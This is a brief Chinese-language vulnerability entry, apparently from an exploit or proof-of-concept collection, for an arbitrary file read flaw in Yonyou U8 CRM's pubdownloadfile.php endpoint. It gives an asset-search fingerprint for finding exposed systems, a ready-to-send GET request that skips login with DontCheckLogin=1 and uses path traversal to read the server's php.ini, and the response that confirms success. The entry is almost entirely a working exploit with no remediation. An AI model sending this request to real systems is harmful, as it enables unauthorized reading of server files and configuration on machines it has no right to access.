# 用友crm客户关系管理pubdownloadfile.php接口任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="用友U8CRM"`
- **请求**：`GET /pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini HTTP/1.1`
- **响应特征**：200 php.ini